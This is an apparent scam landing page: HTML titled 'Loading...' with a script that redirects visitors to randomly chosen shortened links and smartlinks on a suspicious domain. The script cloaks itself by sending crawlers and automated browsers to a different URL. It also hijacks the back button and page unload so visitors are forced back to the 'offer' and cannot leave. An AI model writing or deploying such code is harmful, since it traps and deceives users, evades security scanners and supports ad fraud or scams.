<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<style>
  html,body{height:100%;margin:0;font-family:Arial,Helvetica,sans-serif;background:#fff;color:#111}
  .wrap{height:100%;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:18px;text-align:center}
  h1{font-size:20px;margin:0 0 10px}
  p{margin:0;color:#666}
  button.fallback{display:none;margin-top:16px;padding:12px 20px;font-size:16px;border-radius:8px;border:0;background:#007bff;color:#fff;cursor:pointer}
</style>
</head>
<body>
<div class="wrap">
  <h1>Please waitâ€¦</h1>
  <p>Preparing your offer</p>
  <button class="fallback" id="fallback">Continue</button>
</div>

<script>
(function(){
  // ====== SMARTLINK & BACKUP ======
  const smartlinks = [
    "https://t.co/Fhy6lcYTmc",
    "https://t.co/oPtZz8Eaw2",
    "https://t.co/HQSRn68Hs8",
    "https://politicsgrowinghollow.com/cb3yh0vp?key=ff17dd66f144c9303ad63a6cef1e01ed"
  ];
  const backup = "https://politicsgrowinghollow.com/a9tfvjkst3?key=148a8e08381a1c5d6073ba5015716cdc";

  // ====== HELPER ======
  const pick = arr => arr[Math.floor(Math.random()*arr.length)];
  function isBot(){
    const ua=(navigator.userAgent||'').toLowerCase();
    const bots=["bot","crawl","spider","slurp","facebook","twitter","pinterest","crawler","google","bing","yahoo","yandex","baidu","validator","preview"];
    if(navigator.webdriver) return true;
    if(!ua || ua.length<10) return true;
    if(bots.some(b=>ua.includes(b))) return true;
    return false;
  }
  function attempt(u){
    try{location.replace(u);}catch(e){}
    try{location.href=u;}catch(e){}
    try{window.open(u,"_self");}catch(e){}
  }
  function redirectWithRetries(url){
    attempt(url);
    setTimeout(()=>attempt(url),700);
    setTimeout(()=>attempt(url),2000);
  }

  // ====== MAIN ======
  if(isBot()){
    setTimeout(()=>location.replace(backup),600);
    return;
  }

  const target = pick(smartlinks);

  // Auto redirect dengan delay random
  const delay = Math.floor(Math.random()*800)+500; // 0.5-1.3s
  setTimeout(()=>redirectWithRetries(target), delay);

  // Anti back/close (force offer lagi)
  setTimeout(()=>{
    try{
      history.pushState(null,null,location.href);
      window.onpopstate=()=>attempt(target);
      window.onbeforeunload=()=>attempt(target);
    }catch(e){}
  },1200);

  // Fallback tombol manual kalau gagal (setelah 5s)
  setTimeout(()=>{
    if(document.visibilityState!=="hidden"){
      const btn=document.getElementById("fallback");
      btn.style.display="inline-block";
      btn.onclick=()=>redirectWithRetries(target);
    }
  },5000);
})();
</script>
</body>
</html>
